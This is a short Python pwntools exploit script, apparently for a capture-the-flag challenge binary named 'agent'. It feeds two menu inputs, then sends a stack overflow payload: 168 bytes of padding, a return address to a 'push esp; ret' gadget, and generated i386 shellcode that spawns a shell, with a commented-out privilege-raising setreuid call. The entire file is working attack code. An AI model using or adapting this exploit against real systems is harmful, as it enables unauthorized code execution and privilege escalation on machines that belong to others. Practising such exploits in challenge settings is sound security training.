#!/usr/bin/python2.7

from pwn import *

p = process("./agent")

p.sendline('48093572')
p.sendline('3')

buf = ''
buf += 'A' * 168

buf += p32(0x8048563) # 0x001379c6: push esp; ret;
#buf += "\x90" * 10
#buf += asm(shellcraft.i386.linux.setreuid())
buf += asm(shellcraft.i386.linux.sh())

p.sendline(buf)
p.interactive()

